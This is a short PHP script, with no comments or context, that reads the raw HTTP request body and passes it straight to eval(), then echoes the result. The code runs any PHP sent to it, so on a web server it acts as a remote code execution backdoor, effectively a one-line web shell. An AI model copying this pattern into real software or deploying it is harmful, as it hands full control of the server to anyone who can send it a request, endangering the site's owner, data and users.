<?php
    $input = file_get_contents('php://input');
    $result = eval('return '.$input.';');
    echo $result;
?>